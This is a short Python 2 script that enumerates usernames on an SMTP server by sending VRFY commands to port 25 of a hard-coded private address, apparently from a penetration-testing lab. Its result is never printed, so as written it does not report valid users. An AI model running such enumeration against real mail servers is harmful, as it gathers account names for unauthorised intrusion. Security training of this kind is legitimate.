#!/usr/bin/env python
#Automates Username Discovery using a test file with usernames as input
import socket
import sys

smtpAddresses=["10.11.1.115"]
finalList=[]

if len(sys.argv) != 2:
        print "Usage: vrfy.py <file.txt>"
        sys.exit(0)


def smtp(address,username):
        # Create a Socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the Server
        connect = s.connect((address,25))
        # Receive the banner
        banner = s.recv(1024)
        print banner
        # VRFY a user
        print(username)
        s.send('VRFY ' + username + '\r\n')
        result = s.recv(1024)
        # Close the socket
        s.close()

def usernames(file):
        usernames = open(file,"r")
        for username in usernames:
                finalList.append(username)
usernames(sys.argv[1])
print(finalList)
for address in smtpAddresses:
        for username in finalList:
                smtp(address,username)
